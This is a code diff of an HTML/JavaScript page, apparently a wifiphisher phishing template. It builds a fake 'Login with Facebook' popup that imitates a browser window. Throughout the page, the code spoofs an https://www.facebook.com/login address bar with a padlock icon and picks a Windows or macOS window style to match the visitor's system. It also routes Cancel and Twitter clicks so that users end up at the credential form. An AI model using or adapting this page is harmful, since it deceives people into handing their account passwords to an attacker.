@@ -2,7 +2,7 @@
 <html>
 <head>
 <!--
-Copyright (c) 2016 by Andy Tran (http://codepen.io/andytran/pen/PwoQgO)
+Copyright (c) 2019 by Andy Tran (http://codepen.io/andytran/pen/PwoQgO)
 Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
 The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
 THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
@@ -13,35 +13,107 @@ THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLI
   <link rel="stylesheet" href="static/css/reset.css">
   <link rel='stylesheet prefetch' href='static/css/roboto.css'>
   <link rel='stylesheet prefetch' href='static/css/font-awesome.min.css'>
-  <link rel="stylesheet" href="static/css/style.css">
+  <link rel="stylesheet" href="static/css/stylejs.css">
   <script src='static/js/jquery.min.js'></script>
   <script src="static/js/index.js"></script>
 <script src=".\static\jsframe.js"></script>
 </head>
 
 <script>
-function alertee() {
-  alert("Twitter is not available for the moment!");
+/*This JS script will Detect the connected user OS and show its corresponding popup login */
+function detect_os() {
+
+var OSName="Unknown OS";
+if (navigator.appVersion.indexOf("Win")!=-1) OSName="Windows";
+if (navigator.appVersion.indexOf("Mac")!=-1) OSName="MacOS";
+if (navigator.appVersion.indexOf("X11")!=-1) OSName="UNIX";
+if (navigator.appVersion.indexOf("Linux")!=-1) OSName="Linux";
+
+if (OSName == "Windows") {
+    windows_popup();
+    };
+if (OSName == "MacOS") {
+    macos_popup();
+    };
+
+
+if (OSName == "Linux") {
+    window.location='index.html';
+    };
+
+if (OSName == "UNIX") {
+    window.location='index.html';
+    };
+}
+
+</script>
+
+
+<script>
+// Twitter and google+ login pages will be available soon in the next coming updates
+
+/* This section is for twitter button action and the values can be changed in config.ini So what it does is when the value of twitter button has been set to "alert" and once someone try's to connect using twitter we will show him this alert (the alert message is customizable in config.ini) but if twitter button has been clicked and the value has been set to disabled then it will do nothing and that will be force the user to login using facebook */
+
+function twitter_button() {
+	var twitter_button_behavior = "{{twitter_button}}";
+	if (twitter_button_behavior === "alert") {
+  	alert("{{twitter_button_message}}");
+}
+	else if (twitter_button_behavior === "disable") {
+      return false;
+}
+/* The last else is intended for wifiphisher user if he's entered a wrong value in config.ini then automatically the twitter button will do nothing */
+  else {
+    return false;
+  }
+}
+
+
+</script>
+
+<script>
+/*This part belongs to the cancel button inside the facebook popup. And we have two choices either to show the end user an alert when he's pressing the cancel button or redirecting him to a new page contaning a fail message*/
+
+function facebook_cancel() {
+	var facebook_cancel_button = "{{facebook_cancel_button}}";
+	if (facebook_cancel_button === "alert") {
+ 		alert ("{{cancel_alert_message}}");
+	}
+	else if (facebook_cancel_button === "redirect") {
+ 		window.location='fail.html';
+	}
+	else {
+ 		window.location='fail.html';
+	}	
+ }
+
+</script>
+
+
+<script>
+/* This part is for showing an alert if the user tries to change the website in the address bar of the popup*/
+
+function addressbar_alert() {
+	var addressbar_behavior = {{addressbar_warning}};
+	if (addressbar_behavior === true){
+  		alert ("{{adressbar_warning_message}}");
+ }
+	else if (addressbar_behavior === false){
+		return false;
+ }
 }
 </script>
 
 <script>
-function nointernet() {
-    window.location.href='nointernet.html';
- }
-</script>
 
-<script>
-    function start() {
+// Please Don't mess with the js functions the customization choices are available in config.ini
+/* Bellow is the html page of the popup. I used innerHTML instead of iframe because in some slow computers the js popup can not be dragged fastly and they lag.*/
 
-        const jsFrame = new JSFrame();
-		
-		
-				const HT =  '<div id="navwrapper">' +
+const popup_html_page =  '<div id="navwrapper">' +
 '<table border="1" style="width: 100%; border-collapse: collapse; background-color: #fdfdfd;">' +
 '<tbody>' +
 '<tr style="height: 10px;">' +
-'<td style="width: 100%; height: 10px;"><img src="static/ssl.png" alt="" width="16" height="16" /><span style="color: black; font-size:17px">https</span><span style="color: black; font-size:17px">://www.facebook.com/login</span></td>' +
+'<td style="width: 100%; height: 10px;"><img src="static/ssl.png" alt="" width="16" height="16" /><span style="color: black; font-size:17px" onclick="addressbar_alert()">https</span><span onclick="addressbar_alert()" style="color: black; font-size:17px">://www.facebook.com/login</span></td>' +
 '</tr>' +
 '</tbody>' +
 '</table>' +
@@ -73,37 +145,42 @@ function nointernet() {
 '<table style="height: 43px; width: 100%; border-collapse: collapse; border-color: Lightgrey; background-color: #f5f5f7; border-style: hidden;">' +
 '<tbody>' +
 '<tr style="height: 43px;">' +
-'<td style="width: 100%; height: 43px; text-align: right;"><button style="margin-right: 5px" onclick="nointernet()">Cancel</button>&nbsp;<button class="login-btn">Log In</button></td>' +
+'<td style="width: 100%; height: 43px; text-align: right;"><button style="margin-right: 5px" onclick="facebook_cancel()">Cancel</button>&nbsp;<button class="login-btn">Log In</button></td>' +
 '</tr>' +
 '</tbody>' +
 '</table>' +
 '</footer>' +
 '</div>' +
 '</form>'
-		
 
+    function windows_popup() {
+
+        const jsFrame = new JSFrame();
         const frames = [];
         for (let i = 0; i < 1; i++) {
             const frame = jsFrame.create({
                 name: `Win${i}`,
-                title: `Facebook`,
-                left: 20 , top: 50, width: 920, height: 423,
-				minWidth: 800, minHeight: 400,
+                title: `{{popup_title}}`,
+                left:{{popup_position_left}} , top:{{popup_position_top}}, width:{{popup_width}}, height:{{popup_height}},
+				minWidth:{{popup_minwidth}}, minHeight:{{popup_minheight}},
                 appearanceName: 'redstone',
 				smoothResizeOnIframe:true,
                 style: {
                     overflow: 'hidden'
                 },
-                html: HT
+                html: popup_html_page
             }).show();
 			
-			frame.hideFrameComponent('maximizeButton');
-			frame.hideFrameComponent('minimizeButton');
+			frame.{{windows_maximize_button}}FrameComponent('maximizeButton');
+			frame.{{windows_minimize_button}}FrameComponent('minimizeButton');
+                frame.setMovable({{popup_movable}});
+                frame.setResizable({{popup_resizable}});
 
             frame.on('minimizeButton', 'click', (_frame, evt) => {
 
                 frame.hideFrameComponent('minimizeButton');
                 frame.showFrameComponent('deminimizeButton');
+		{{windows_minimizing_behavior}}_frame.closeFrame();
 
                 const force = true;
 
@@ -144,8 +221,8 @@ function nointernet() {
                 frame.setPosition(0, 0);
                 frame.setSize(window.innerWidth - 2, window.innerHeight - 2, true);
 
-                frame.setMovable(true);
-                frame.setResizable(true);
+                frame.setMovable({{popup_maximized_movable}});
+                frame.setResizable({{popup_maximized_resizable}});
 
 
             });
@@ -171,12 +248,110 @@ function nointernet() {
             frames.push(frame);
         }
         frames[0].requestFocus();
+
+
+
     }
 
 
 
+	function macos_popup() {
+       		const jsFrame = new JSFrame();		
+		const frames = [];
+
+        for (let i = 0; i < 1; i++) {
+            const frame = jsFrame.create({
+                name: `Win${i}`,
+                title: `{{popup_title}}`,
+                left:{{popup_position_left}} , top:{{popup_position_top}}, width:{{popup_width}}, height:{{popup_height}},
+				minWidth:{{popup_minwidth}}, minHeight:{{popup_minheight}},
+                appearanceName: 'yosemite',
+				smoothResizeOnIframe:true,
+                style: {
+                    overflow: 'hidden'
+                },
+                html: popup_html_page
+            }).show();
+			
+
+                frame.{{macos_minimize_button}}FrameComponent('minimizeButton');
+                frame.{{macos_zoom_button}}FrameComponent('zoomButton');
+                frame.setMovable({{popup_movable}});
+                frame.setResizable({{popup_resizable}});
+
+
+            frame.{{macos_buttons}}setControl({
+                styleDisplay:'inline',
+                maximizeButton: 'zoomButton',
+                demaximizeButton: 'dezoomButton',
+                minimizeButton: 'minimizeButton',
+                deminimizeButton: 'deminimizeButton',
+                hideButton: 'closeButton',
+                animation: {{macos_animation}},
+                animationDuration: 150,
+
+            });
+
+            frame.on('zoomButton', 'click', (_frame, evt) => {
+
+               _frame.extra.__restore_info = {
+                    org_left: _frame.getLeft(),
+                    org_top: _frame.getTop(),
+                    org_width: _frame.getWidth(),
+                    org_height: _frame.getHeight()
+                };
+
+                frame.setPosition(0, 0);
+                frame.setSize(window.innerWidth - 2, window.innerHeight - 2, true);
+
+                frame.hideFrameComponent('zoomButton');
+                frame.showFrameComponent('dezoomButton');
+
+                frame.setMovable({{popup_maximized_movable}});
+                frame.setResizable({{popup_maximized_resizable}});
+
+
+            });
+
+
+   frame.on('dezoomButton', 'click', (_frame, evt) => {
+
+                  _frame.setPosition(_frame.extra.__restore_info.org_left, _frame.extra.__restore_info.org_top);
+
+                const force = true;
+                _frame.setSize(_frame.extra.__restore_info.org_width, _frame.extra.__restore_info.org_height, force);
+                frame.hideFrameComponent('dezoomButton');
+                frame.showFrameComponent('zoomButton');
+
+                frame.setMovable({{popup_movable}});
+                frame.setResizable({{popup_resizable}});
+
+
+            });
+
+
+            frame.on('{{macos_minimizing_behavior}}Button', 'click', (frame, evt) => {
+   	     frame.control.doHide({
+                callback: (frame, info) => {               
+                    frame.closeFrame();
+                }
+            });  });
+
+            frame.control.on('hid', (frame, info) => {
+                frame.closeFrame();
+            });
+
+
+
+
+            frames.push(frame);
+        }
+        frames[0].requestFocus();
+    }
+
 
 </script>
+
 
 
 <body style="-moz-user-select: none; -webkit-user-select: none; -ms-user-select:none; user-select:none;-o-user-select:none;">
@@ -199,11 +374,11 @@ function nointernet() {
       </div>
 
       <div class="col">
-        <a  onclick="start()" class="fb btn">
-          <i class="fa fa-fw"></i> Login with Facebook
+        <a  onclick="detect_os()" class="fb btn">
+          Login with Facebook
         </a>
-        <a onclick="alertee()" class="twitter btn">
-          <i class="fa fa-fw"></i> Login with Twitter
+        <a onclick="twitter_button()" class="twitter btn">
+          Login with Twitter
         </a>
 
       </div>
